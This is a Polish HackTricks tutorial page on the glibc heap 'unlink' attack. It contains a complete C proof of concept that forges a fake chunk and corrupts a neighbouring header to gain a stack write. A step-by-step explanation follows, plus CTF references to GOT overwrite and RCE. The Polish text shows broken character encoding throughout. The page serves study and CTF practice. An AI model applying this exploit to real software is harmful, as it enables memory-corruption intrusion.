# Atak Unlink

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na GitHubie.

</details>

## Podstawowe informacje

Kiedy ten atak zosta odkryty, g贸wnie pozwala na WWW (Write What Where), jednak dodano **sprawdzenia**, co sprawio, 偶e nowa wersja ataku staa si bardziej interesujca, ale r贸wnie偶 bardziej zo偶ona i **bezu偶yteczna**.

### Przykad kodu:

<details>

<summary>Kod</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* Atak nie dziaa, jeli s u偶ywane tcaches (po wersji 2.26)

### Cel

* Zmodyfikuj wska藕nik do bloku na stosie, aby wskazywa na stos, dziki czemu mo偶liwe bdzie zmienianie zawartoci stosu poprzez zapisywanie w bloku

### Wymagania

* Pewna kontrola w pamici (np. stosie), aby utworzy kilka blok贸w, nadajc wartoci niekt贸rym atrybutom.
* Wyciek stosu w celu ustawienia wska藕nik贸w faszywego bloku.

### Atak

* Istniej dwa bloki (blok1 i blok2)
* Atakujcy kontroluje zawarto bloku1 oraz nag贸wki bloku2.
* W bloku1 atakujcy tworzy struktur faszywego bloku:
* Aby omin zabezpieczenia, upewnia si, 偶e pole `size` jest poprawne, aby unikn bdu: `corrupted size vs. prev_size while consolidating`
* oraz pola `fd` i `bk` faszywego bloku wskazuj na miejsce, gdzie przechowywany jest wska藕nik bloku1 z przesuniciami odpowiednio -3 i -2, wic `fake_chunk->fd->bk` i `fake_chunk->bk->fd` wskazuj na pozycj w pamici (stosie), gdzie znajduje si rzeczywisty adres bloku1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Nag贸wki bloku2 s modyfikowane, aby wskazywa, 偶e poprzedni blok nie jest u偶ywany, a rozmiar to rozmiar zawartego faszywego bloku.
* Gdy drugi blok zostanie zwolniony, to ten faszywy blok zostanie odczony:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Wczeniej sprawiono, 偶e `fake_chunk->fd->bk` i `fake_chunk->fd->bk` wskazuj na to samo miejsce (miejsce na stosie, gdzie przechowywany jest `blok1`), wic by to poprawny lista poczona. Poniewa偶 **oba wskazuj na to samo miejsce**, tylko ostatni (`fake_chunk->bk->fd = fake_chunk->fd`) bdzie mia **efekt**.
* Spowoduje to **nadpisanie wska藕nika do bloku1 na stosie adresem (lub bajtami) przechowywanym 3 adresy wczeniej na stosie**.
* Dlatego jeli atakujcy m贸gby ponownie kontrolowa zawarto bloku1, bdzie m贸g **pisa wewntrz stosu**, potencjalnie nadpisa adres powrotu, pomijajc canary, oraz modyfikowa wartoci i wska藕niki zmiennych lokalnych. Nawet ponownie modyfikujc adres bloku1 przechowywany na stosie na inne miejsce, gdzie jeli atakujcy m贸gby ponownie kontrolowa zawarto bloku1, bdzie m贸g pisa w dowolnym miejscu.
* Zauwa偶, 偶e to byo mo偶liwe, poniewa偶 **adresy s przechowywane na stosie**. Ryzyko i eksploatacja mog zale偶e od **miejsca, gdzie s przechowywane adresy do faszywego bloku**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Odnoniki

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* Chocia偶 byoby dziwne znalezienie ataku unlink nawet w CTF, tutaj masz kilka rozwiza, gdzie ten atak zosta u偶yty:
* Przykad CTF: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* W tym przykadzie, zamiast stosu, jest tablica adres贸w zaalokowanych za pomoc malloc. Atak unlink jest wykonywany, aby m贸c zaalokowa tutaj blok, co pozwala kontrolowa wska藕niki tablicy zaalokowanych adres贸w. Nastpnie istnieje inna funkcjonalno, kt贸ra pozwala modyfikowa zawarto blok贸w w tych adresach, co pozwala wskazywa adresy na GOT, modyfikowa adresy funkcji w celu uzyskania wyciek贸w i RCE.
*

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
